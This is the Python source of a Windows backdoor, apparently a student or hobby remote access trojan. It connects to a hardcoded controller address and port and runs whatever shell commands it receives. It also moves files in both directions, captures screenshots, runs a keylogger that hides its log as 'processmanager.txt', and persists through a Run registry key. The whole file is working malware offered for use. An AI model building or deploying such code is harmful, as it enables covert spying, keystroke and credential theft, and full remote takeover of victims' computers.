import socket
import json
import subprocess
import os
from pynput.keyboard import Listener
import pyautogui
import keylogger
import threading
import shutil
import time
import sys

IP = '172.26.40.74'
PORT = 9999
TIME_GAP = 10

class Keylogger():
    keys=[]
    count=0
    flag=0
    path = os.environ['appdata'] + '\\processmanager.txt'
    #path = '/root/processmanager.txt'
    def on_press(self, key):   
        self.keys.append(key)
        self.count += 1
        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []
    
    def read_logs(self):
        with open(self.path, 'rt') as f:
            return f.read()
    
    def write_file(self, keys):
        with open(self.path, 'a') as f:
            for key in keys:
                k= str(key).replace("'","")
                if k.find('backspace')>0:
                    f.write(' Backspace ')
                elif k.find('enter')>0:
                    f.write('\n')
                elif k.find('shift')>0:
                    f.write(' Shift ')
                elif k.find('space')>0:
                    f.write(' ')
                elif k.find('caps_lock')>0:
                    f.write(' caps_lock ')
                elif k.find('ctrl')>0:
                    f.write(' CTRL ')
                elif k.find('key'):
                    f.write(k)

    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()
    
    def self_destruct(self):
        self.flag=1
        listener.stop()
        os.remove(self.path)

def reliable_send(data):
    jsondata=json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data=''
    while True:
        try:
            data=data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    f=open(file_name, 'rb')
    s.send(f.read())

def screenshot():
    myscreenshot=pyautogui.screenshot()
    myscreenshot.save("screen.png")

def download_file(file_name):
    f= open(file_name, 'wb')
    s.settimeout(1)
    chunk=s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk=s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def persist(reg_name, copy_name):
    file_location= os.environ['appdata']+ '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v '+ reg_name + ' /t REG_SZ /d "' +file_location + '"', shell= True)
            reliable_send('[+] Created Presistance with Reg_Keys: ' +reg_name)
        else:
            reliable_send('[+] presistance already exist')
        
    except:
        reliable_send("[+]Error creating presistance")
def connection():
    while True:
        time.sleep(TIME_GAP)
        try:
            s.connect((IP, PORT))
            shell()
            s.close()
            break
        except:
            connection()
def shell():
    while True:
        command= reliable_recv()
        if command=="quit":
            break
        elif command=="help":
            pass
        elif command=="clear":
            pass
        elif command[:11]=='persistence':
            reg_name, copy_name= command[12:].split(' ')
            persist(reg_name, copy_name)
        elif command[:6]=="upload":
            download_file(command[7:])
        elif command[:8]=="download":
            upload_file(command[9:])
        elif command[:3]=="cd ":
            os.chdir(command[3:])
        elif command[:10]=="screenshot":
            screenshot()
            upload_file("screen.png")
            os.remove("screen.png")
        elif command[:12] =='keylog_start':
            keylog=Keylogger()
            t=threading.Thread(target=keylog.start)
            t.start()
            reliable_send("[+] keylogger started")
        elif command[:11]=='keylog_dump':
            logs=keylog.read_logs()
            reliable_send(logs)
        elif command[:11]=='keylog_stop':
            keylog.self_destruct()
            t.join()
            reliable_send("[+] keylogger stoped")
        elif command[:8]=="shutdown":
            os.system("shutdown /s /t %s" %(command[9:]))
            reliable_send("shuting request sent to target's pc")
            break
        else:
            execute= subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result=execute.stdout.read() + execute.stderr.read()
            result=result.decode()
            reliable_send(result)


s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect(('192.168.225.120', 9999))
# shell()
connection()
